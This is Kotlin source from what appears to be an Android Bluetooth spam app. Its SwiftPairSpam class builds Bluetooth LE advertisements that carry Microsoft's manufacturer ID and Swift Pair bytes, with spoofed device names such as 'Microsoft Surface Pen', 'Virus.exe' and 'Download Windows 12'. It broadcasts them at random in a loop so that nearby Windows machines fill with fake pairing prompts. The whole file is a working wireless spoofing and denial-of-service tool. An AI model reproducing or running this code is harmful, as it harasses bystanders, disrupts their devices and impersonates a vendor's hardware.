package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.io.ByteArrayOutputStream
import java.nio.charset.StandardCharsets
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class SwiftPairSpam : Spammer {

    private var devices: Array<String> = arrayOf()
    private lateinit var devicesAdvertiseData: Array<AdvertiseData>
    private var blinkRunnable: Runnable? = null

    private var _isSpamming = false
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    init {
        devices = arrayOf(
            "Windows Protocol", "DLL Missing", "Download Windows 12",
            "Microsoft Bluetooth Keyboard", "Microsoft Arc Mouse",
            "Microsoft Surface Ergonomic Keyboard", "Microsoft Surface Precision Mouse",
            "Microsoft Modern Mobile Mouse", "Microsoft Surface Mobile Mouse",
            "Microsoft Surface Headphones", "Microsoft Surface Laptop",
            "Microsoft Surface Pro", "Microsoft Surface Duo",
            "Microsoft Xbox Wireless Controller", "Microsoft Surface Earbuds",
            "Microsoft Surface Go", "Microsoft Surface Studio",
            "Microsoft Surface Book", "Microsoft Surface Hub",
            "Microsoft Surface Pen", "Microsoft Surface Dial",
            "Microsoft Surface Slim Pen", "Microsoft Surface Dock",
            "Microsoft Surface Thunderbolt Dock", "Microsoft Surface Audio",
            "Free VPN", "Your Mom's PC", "Your Dad's iPhone",
            "404 Device Not Found", "Blue Screen of Death", "Installing Windows 99...",
            "Virus.exe", "Trojan Horse", "Neighbor's Wi-Fi", "Pirated Windows",
            "Keyboard for Cats", "Mouse for Dogs", "Pizza Delivery Drone",
            "Smart Fridge", "Smart Light Bulb", "RoboVac 3000",
            "Google Eye", "Apple iPot", "Samsung Smart Toaster",
            "PlayStation 10", "Xbox Infinite", "Nintendo Switch Pro Max",
            "AI Calculator", "Time Travel Watch",
            "Cyber Sock", "USB Breadbox", "Bluetooth Fork",
            "Wi-Fi Toothbrush", "Quantum Toaster", "Meme Dispenser",
            "Hello by ars3nb", "Hello by ars2nb"
        )

        devicesAdvertiseData = devices.map { deviceName ->
            val outputStream = ByteArrayOutputStream()
            outputStream.write(byteArrayOf(0x03, 0x00, 0x80.toByte()))
            outputStream.write(deviceName.toByteArray(StandardCharsets.UTF_8))
            outputStream.toByteArray()
        }.map { dataBytes ->
            AdvertiseData.Builder()
                .addManufacturerData(0x0006, dataBytes)
                .build()
        }.toTypedArray()
    }

    override fun start() {
        executor.execute {
            _isSpamming = true
            repeat(Helper.MAX_LOOP + 1) { _ ->
                if (!_isSpamming) return@execute

                val data = devicesAdvertiseData.random()
                val bluetoothAdvertiser = BluetoothAdvertiser()

                bluetoothAdvertiser.advertise(data, null)

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@execute
                }

                bluetoothAdvertiser.stopAdvertising()
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }

}